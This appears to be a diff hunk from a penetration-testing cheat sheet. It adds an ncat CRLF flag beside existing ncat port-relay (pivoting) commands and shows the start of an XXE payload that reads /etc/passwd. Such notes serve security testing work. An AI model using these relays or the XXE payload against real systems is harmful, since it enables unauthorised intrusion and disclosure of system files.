@@ -390,6 +390,9 @@ ncat --sh-exec "ncat.exe IPofM340 502" -lk 502
 ncat --sh-exec "ncat 10.236.181.104 27000" -lk 27000
 ncat --sh-exec "ncat.exe gateway.zscaler.net 80" -lk 8080
 
+NCAT crlf:
+ncat -C
+
 XXE
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  
            <bugreport>  
